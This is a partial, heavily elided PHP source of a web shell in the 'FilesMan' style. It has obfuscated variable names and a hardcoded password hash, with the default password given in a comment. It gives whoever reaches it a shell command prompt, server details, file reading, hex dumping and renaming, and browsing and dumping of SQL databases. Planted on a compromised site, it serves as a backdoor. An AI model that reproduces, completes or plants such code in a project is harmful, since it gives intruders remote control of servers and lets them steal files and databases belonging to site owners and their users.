<?php
$▛ = "e90a3e20701ffd5398dd77adc5678973"; //default password: natty
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
function hardLogin() {
	...
	die("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:000000;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#00ff26;color:#fff;cursor:pointer;'></form></pre>");
}
...
<style>
	...
	h1			{border-left:5px solid #5500ff;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
	div.content	{padding:5px;margin-left:5px;background-color:#000000;}
	a			{text-decoration:none;}
	a:hover		{text-decoration:underline;}
	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
	.tooltip:hover::after {opacity:1;visibility:visible;}
	.ml1		{border:1px solid #fff;padding:5px;margin:0;overflow:auto;}
	.bigarea	{min-width:100%;max-width:100%;height:400px;}
	input, textarea, select	{margin:0;color:#fff;background-color:#000000;border:none;font:9pt Courier New;outline:none;}
	...
	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#000000;position:absolute;pointer-events:none;display:block;}
	form		{margin:0px;}
	#toolsTbl	{text-align:center;}
	#fak 		{background:none;}
	#fak td 	{padding:5px 0 0 0;}
	iframe		{border:1px solid #4e03fc;}
	.toolsInp	{width:300px}
	.main th	{text-align:left;background-color:#000000;}
	.main tr:hover{background-color:#354252;}
	.main td, th{vertical-align:middle;}
	input[type='submit']{background-color:#5500ff;}
	input[type='button']{background-color:#5500ff;}
	input[type='submit']:hover{background-color:#00ff26;}
	input[type='button']:hover{background-color:#00ff26;}
...
<input type=hidden name=charset>
	...
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
		 ...
		 '<table style="background-color:#5500ff;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
}
function hardFooter() {
	...
	switch($_POST['p2']) {
		...
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #000000;color:black;">';
		...
		case 'hexdump':
			...
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#000000><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#000000><pre>'.$h[1].'</pre></td><td bgcolor=#000000><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
...
function add(cmd) {
	...
	echo '</textarea><table style="border:1px solid #4e03fc;background-color:#000000;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
	...
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='border-top:2px solid #4e03fc;'><span>Tables:</span><br><br>";
				...
				echo "<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #4e03fc;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
